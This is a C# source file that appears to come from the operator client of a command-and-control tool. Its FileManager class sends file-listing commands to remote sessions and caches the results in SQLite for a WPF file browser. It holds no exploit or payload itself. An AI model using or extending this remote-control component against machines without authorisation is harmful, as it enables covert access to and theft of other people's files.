using System;
using System.IO;
using System.Text;
using System.Windows;
using Newtonsoft.Json;
using System.Threading;
using System.Data.SQLite;
using System.Collections.Generic;
using System.Collections.ObjectModel;

// 文件管理
namespace Client
{
    public class FileManager
    {
        // 获取文件管理信息
        public static void GetFileManagerInfo(SessionController sessionController)
        {
            string currentPath;
            sessionController.rootFileInfo = GetRootFileInfo(sessionController.selectedSessionInfo.sid, out currentPath);
            sessionController.inputPath_TextBox.Text = currentPath;
            if (sessionController.rootFileInfo != null)
            {
                sessionController.dirTree_TreeView.ItemsSource = sessionController.rootFileInfo.subFileInfoList;
                GetFileInfoList(sessionController.selectedSessionInfo.sid, currentPath, sessionController);
            }
            else
            {
                sessionController.rootFileInfo = new FileInfo();
            }
        }

        // 获取根目录的文件信息
        private static FileInfo GetRootFileInfo(string sid, out string currentPath)
        {
            currentPath = ".";
            FileInfo rootFileInfo = null;
            try
            {
                using (SQLiteConnection conn = new SQLiteConnection(@"Data Source = config\client.db"))
                {
                    conn.Open();
                    string sql = "select * from FileInfo where sid=@sid";
                    using (SQLiteCommand sqlCommand = new SQLiteCommand(sql, conn))
                    {
                        sqlCommand.Parameters.AddWithValue("@sid", sid);
                        using (SQLiteDataReader dataReader = sqlCommand.ExecuteReader())
                        {
                            while (dataReader.Read())
                            {
                                currentPath = (string)dataReader["currentPath"];
                                string fileInfoBase64 = (string)dataReader["fileInfoBase64"];
                                if (fileInfoBase64 != "")
                                {
                                    using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(fileInfoBase64)))
                                    {
                                        rootFileInfo = ProtoBuf.Serializer.Deserialize<FileInfo>(ms);
                                    }
                                }
                                break;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "错误", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            return rootFileInfo;
        }

        // 获取文件信息列表
        public static void GetFileInfoList(string sid, string targetPath, SessionController sessionController)
        {
            if (sessionController.selectedSessionInfo == null || sessionController.selectedSessionInfo.sid != sid)
            {
                return;
            }

            // 数据库中存在
            ObservableCollection<FileInfo> subFileInfoList = sessionController.rootFileInfo.GetSubFileInfoList(targetPath);
            if (subFileInfoList != null)
            {
                sessionController.inputPath_TextBox.Text = targetPath;
                sessionController.dirTree_TreeView.ItemsSource = null;
                sessionController.dirTree_TreeView.ItemsSource = sessionController.rootFileInfo.subFileInfoList;
                sessionController.fileInfoList_DataGrid.ItemsSource = null;
                sessionController.fileInfoList_DataGrid.ItemsSource = subFileInfoList;
                return;
            }

            // 数据库中不存在

            // 下发命令
            Dictionary<string, string> postParameter = new Dictionary<string, string>
            {
                { "sid", sid },
                { "targetPath", targetPath },
                { "scriptType", "GetFileInfoList" }
            };
            Dictionary<string, string> scriptPara = new Dictionary<string, string>
            {
                { "targetPath", targetPath }
            };
            Function.IssueCommand("GetFileInfoList_", Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(scriptPara))), postParameter);
        }

        // 更新数据库文件信息
        public static void UpdateDatabaseFileInfo(string sid, string data, SessionController sessionController)
        {
            if (data == "0")
            {
                new Thread(() => WindowsNotice.SystemLogNotice(new NewData() { username = "C2 Server", content = "获取文件信息列表失败" })).Start();
                return;
            }
            if (sessionController.rootFileInfo == null)
            {
                return;
            }

            // 构造目标路径的子文件信息列表
            string[] subFileInfoArray = data.Split('\n');
            List<FileInfo> newSubFileInfoList = new List<FileInfo>();
            for (int i = 1; i < subFileInfoArray.Length; i++)
            {
                string[] currentFileInfoArray = subFileInfoArray[i].Split(',');
                string fileType = currentFileInfoArray[0] == "1" ? "📁" : "📄";
                string fileName = currentFileInfoArray[1];
                string fileSize = Function.FormatFileSize(currentFileInfoArray[2]);
                string fileChangeTime = currentFileInfoArray[3];
                FileInfo subFileInfo = new FileInfo() { fileType = fileType, fileName = fileName, fileSize = fileSize, fileChangeTime = fileChangeTime };
                newSubFileInfoList.Add(subFileInfo);
            }

            // 更新目标路径的子文件信息列表
            string targetPath = subFileInfoArray[0].Replace("*", "");
            FileInfo targetFileInfo = sessionController.rootFileInfo.GetFileInfo(targetPath);
            targetFileInfo.UpdateSubFileInfoList(newSubFileInfoList);

            string rootFileInfoBase64;
            using (MemoryStream ms = new MemoryStream())
            {
                ProtoBuf.Serializer.Serialize(ms, sessionController.rootFileInfo);
                rootFileInfoBase64 = Convert.ToBase64String(ms.ToArray());
            }
            try
            {
                using (SQLiteConnection conn = new SQLiteConnection(@"Data Source = config\client.db"))
                {
                    conn.Open();
                    string sql = "replace into FileInfo (sid, currentPath, fileInfoBase64) values (@sid, @currentPath, @fileInfoBase64)";
                    using (SQLiteCommand sqlCommand = new SQLiteCommand(sql, conn))
                    {
                        sqlCommand.Parameters.AddWithValue("@sid", sid);
                        sqlCommand.Parameters.AddWithValue("@currentPath", targetPath);
                        sqlCommand.Parameters.AddWithValue("@fileInfoBase64", rootFileInfoBase64);
                        sqlCommand.ExecuteNonQuery();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "错误", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            GetFileInfoList(sid, targetPath, sessionController);
        }
    }
}